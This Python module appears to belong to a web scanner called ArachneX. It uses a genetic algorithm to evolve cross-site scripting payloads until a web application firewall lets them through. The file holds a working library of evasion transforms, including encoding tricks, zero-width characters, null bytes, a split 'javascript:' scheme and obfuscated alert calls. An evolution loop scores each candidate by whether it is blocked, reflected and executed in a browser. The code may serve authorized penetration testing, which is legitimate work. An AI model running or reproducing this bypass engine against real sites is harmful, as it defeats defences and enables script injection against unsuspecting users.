"""
Evolutionary WAF bypass.

When a context-appropriate payload is blocked by a WAF, ArachneX evolves
it. We use a genetic algorithm over a *transformation grammar*: payloads
are not mutated as raw bytes, but as ASTs of (token-stream, transformation)
pairs, which keeps mutations syntactically valid more often than random
byte mutation.

Fitness has three components:

    fitness = 0.5 * (1 - waf_block_prob) +
              0.3 * reflection_intactness +
              0.2 * (1 if oracle_executes else 0)

Where:
  • waf_block_prob: 1 if response matches the baseline block signature,
    else 0. Cheap signal — no execution required.
  • reflection_intactness: longest-common-substring(payload_canonical_chars,
    response) / len(payload_canonical_chars). Tells us how much survived.
  • oracle_executes: only evaluated for the top-k of each generation
    (expensive — full browser run).

We use elitism + tournament selection + bounded mutation magnitude. This
typically converges in 20–60 generations on real WAFs.

Crucial: we cap the total request budget. We do not let a stuck GA hammer
a target indefinitely.
"""

from __future__ import annotations

import random
import re
from dataclasses import dataclass, field
from typing import Awaitable, Callable, Optional


# --------------------------------------------------------------------------- #
# Transformation primitives
# --------------------------------------------------------------------------- #


def _case_toggle(p: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p))


def _random_case(p: str) -> str:
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in p)


def _insert_html_comment_in_tag(p: str) -> str:
    # <svg/onload=...> -> <svg/<!--x-->onload=...>
    return re.sub(r"(\<[a-z][a-z0-9]*)\s+", r"\1/<!--x-->/", p, count=1, flags=re.I)


def _split_event_handler(p: str) -> str:
    return re.sub(r"(on)(\w+)", r"\1\u200B\2", p, flags=re.I)


def _unicode_zwj_in_tag(p: str) -> str:
    return re.sub(r"(\<[a-z])", r"\1\u200d", p, count=1, flags=re.I)


def _url_encode_specials(p: str) -> str:
    return p.replace(" ", "%20").replace('"', "%22")


def _double_url_encode_lt(p: str) -> str:
    return p.replace("<", "%253C")


def _hex_entity_letters(p: str) -> str:
    # Encode random letters as &#xNN;
    out = []
    for c in p:
        if c.isalpha() and random.random() < 0.25:
            out.append(f"&#x{ord(c):x};")
        else:
            out.append(c)
    return "".join(out)


def _decimal_entity_letters(p: str) -> str:
    out = []
    for c in p:
        if c.isalpha() and random.random() < 0.25:
            out.append(f"&#{ord(c)};")
        else:
            out.append(c)
    return "".join(out)


def _add_null_byte_after_lt(p: str) -> str:
    return p.replace("<", "<\x00", 1)


def _backtick_strings(p: str) -> str:
    # Replace single-quoted strings with backticks (JS contexts)
    return re.sub(r"'([^']*)'", r"`\1`", p)


def _swap_alert_for_top(p: str) -> str:
    return p.replace("alert(", "top['ale'+'rt'](")


def _swap_alert_for_eval(p: str) -> str:
    return p.replace("alert(", "eval(name=`ale`+`rt`,name+'(')").replace(")", ")')", 1)


def _add_tab_inside_javascript_scheme(p: str) -> str:
    return p.replace("javascript:", "java\tscript:")


def _add_newline_inside_javascript_scheme(p: str) -> str:
    return p.replace("javascript:", "java\nscript:")


def _wrap_in_svg(p: str) -> str:
    return f"<svg><x>{p}</x></svg>"


def _wrap_in_math(p: str) -> str:
    return f"<math><mi>{p}</mi></math>"


def _double_letters(p: str) -> str:
    # <scrscriptipt> trick for naive strip-once filters
    return re.sub(r"\<(\w+)", lambda m: f"<{m.group(1)[0]}{m.group(1)}", p, count=1)


TRANSFORMS: list[tuple[str, Callable[[str], str]]] = [
    ("case_toggle",          _case_toggle),
    ("random_case",          _random_case),
    ("insert_html_comment",  _insert_html_comment_in_tag),
    ("split_event_handler",  _split_event_handler),
    ("zwj_in_tag",           _unicode_zwj_in_tag),
    ("url_encode_specials",  _url_encode_specials),
    ("double_url_encode_lt", _double_url_encode_lt),
    ("hex_entity_letters",   _hex_entity_letters),
    ("decimal_entity_letters", _decimal_entity_letters),
    ("null_byte_after_lt",   _add_null_byte_after_lt),
    ("backtick_strings",     _backtick_strings),
    ("alert_to_top",         _swap_alert_for_top),
    ("alert_to_eval",        _swap_alert_for_eval),
    ("tab_in_js_scheme",     _add_tab_inside_javascript_scheme),
    ("newline_in_js_scheme", _add_newline_inside_javascript_scheme),
    ("wrap_in_svg",          _wrap_in_svg),
    ("wrap_in_math",         _wrap_in_math),
    ("double_letters",       _double_letters),
]


# --------------------------------------------------------------------------- #
# Population
# --------------------------------------------------------------------------- #


@dataclass
class Genome:
    seed: str                            # original payload
    pipeline: list[str]                  # list of transform labels, in order
    materialized: str = ""               # cached output of applying pipeline to seed
    fitness: float = 0.0
    blocked: bool = False
    executed: bool = False
    intactness: float = 0.0

    def materialize(self) -> str:
        out = self.seed
        for label in self.pipeline:
            fn = dict(TRANSFORMS).get(label)
            if fn:
                try:
                    out = fn(out)
                except Exception:
                    pass
        self.materialized = out
        return out


# --------------------------------------------------------------------------- #
# Fitness probe interface
# --------------------------------------------------------------------------- #


# Caller provides an async probe: given a payload, return:
#   (was_blocked: bool, intactness: float in [0,1], oracle_executed: bool)
ProbeFn = Callable[[str], Awaitable[tuple[bool, float, bool]]]


# --------------------------------------------------------------------------- #
# Evolution loop
# --------------------------------------------------------------------------- #


class PayloadEvolver:
    def __init__(
        self,
        seed_payloads: list[str],
        pop_size: int = 24,
        generations: int = 30,
        elitism: int = 4,
        tournament_k: int = 3,
        max_pipeline_len: int = 4,
        rng: Optional[random.Random] = None,
    ) -> None:
        if not seed_payloads:
            raise ValueError("seed_payloads must be non-empty")
        self.seeds = seed_payloads
        self.pop_size = pop_size
        self.generations = generations
        self.elitism = elitism
        self.tournament_k = tournament_k
        self.max_pipeline_len = max_pipeline_len
        self.rng = rng or random.Random()
        self.history: list[Genome] = []

    # ----------------------------- population ops ----------------------------

    def _new_genome(self) -> Genome:
        seed = self.rng.choice(self.seeds)
        n = self.rng.randint(0, self.max_pipeline_len)
        pipeline = [self.rng.choice(TRANSFORMS)[0] for _ in range(n)]
        return Genome(seed=seed, pipeline=pipeline)

    def _initial_population(self) -> list[Genome]:
        # Seed population: half raw seeds with empty pipelines, half random.
        pop: list[Genome] = []
        for s in self.seeds[: self.pop_size // 2]:
            pop.append(Genome(seed=s, pipeline=[]))
        while len(pop) < self.pop_size:
            pop.append(self._new_genome())
        return pop

    def _tournament(self, pop: list[Genome]) -> Genome:
        contenders = self.rng.sample(pop, k=min(self.tournament_k, len(pop)))
        return max(contenders, key=lambda g: g.fitness)

    def _crossover(self, a: Genome, b: Genome) -> Genome:
        if self.rng.random() < 0.5:
            seed = a.seed
        else:
            seed = b.seed
        # one-point crossover on pipelines
        if a.pipeline and b.pipeline:
            cut_a = self.rng.randint(0, len(a.pipeline))
            cut_b = self.rng.randint(0, len(b.pipeline))
            pipeline = (a.pipeline[:cut_a] + b.pipeline[cut_b:])[: self.max_pipeline_len]
        else:
            pipeline = (a.pipeline or b.pipeline)[: self.max_pipeline_len]
        return Genome(seed=seed, pipeline=pipeline)

    def _mutate(self, g: Genome) -> Genome:
        r = self.rng.random()
        new_pipeline = list(g.pipeline)
        if r < 0.4 and len(new_pipeline) < self.max_pipeline_len:
            new_pipeline.append(self.rng.choice(TRANSFORMS)[0])
        elif r < 0.7 and new_pipeline:
            idx = self.rng.randrange(len(new_pipeline))
            new_pipeline[idx] = self.rng.choice(TRANSFORMS)[0]
        elif new_pipeline:
            new_pipeline.pop(self.rng.randrange(len(new_pipeline)))
        return Genome(seed=g.seed, pipeline=new_pipeline)

    # ------------------------------- fitness --------------------------------

    @staticmethod
    def _score(g: Genome) -> float:
        # Compose the three signals
        f = 0.0
        f += 0.5 * (0.0 if g.blocked else 1.0)
        f += 0.3 * g.intactness
        f += 0.2 * (1.0 if g.executed else 0.0)
        return f

    async def _evaluate(self, g: Genome, probe: ProbeFn,
                        run_oracle_top_k: bool) -> None:
        payload = g.materialize()
        try:
            blocked, intact, executed = await probe(payload)
        except Exception:
            blocked, intact, executed = True, 0.0, False
        g.blocked = blocked
        g.intactness = intact
        g.executed = executed if run_oracle_top_k else False
        g.fitness = self._score(g)

    # ----------------------------- public loop ------------------------------

    async def run(self, probe: ProbeFn, oracle_top_k: int = 3) -> Genome:
        """
        Probe is async. The engine wires it up to the http client + WAF
        baseline + (sometimes) the headless oracle.

        Returns the best genome ever seen. Caller decides whether to
        report (e.g. only if executed or intactness above threshold).
        """
        pop = self._initial_population()

        # Initial evaluation — without oracle
        for g in pop:
            await self._evaluate(g, probe, run_oracle_top_k=False)
        self.history.extend(pop)

        for _ in range(self.generations):
            pop.sort(key=lambda g: g.fitness, reverse=True)
            # Run the (expensive) browser oracle on top-k
            for g in pop[:oracle_top_k]:
                await self._evaluate(g, probe, run_oracle_top_k=True)
                if g.executed:
                    return g                 # short-circuit on success

            elites = pop[: self.elitism]
            children: list[Genome] = []
            while len(children) < self.pop_size - self.elitism:
                a = self._tournament(pop)
                b = self._tournament(pop)
                child = self._crossover(a, b)
                if self.rng.random() < 0.8:
                    child = self._mutate(child)
                children.append(child)

            for g in children:
                await self._evaluate(g, probe, run_oracle_top_k=False)
            self.history.extend(children)
            pop = elites + children

        pop.sort(key=lambda g: g.fitness, reverse=True)
        return pop[0]
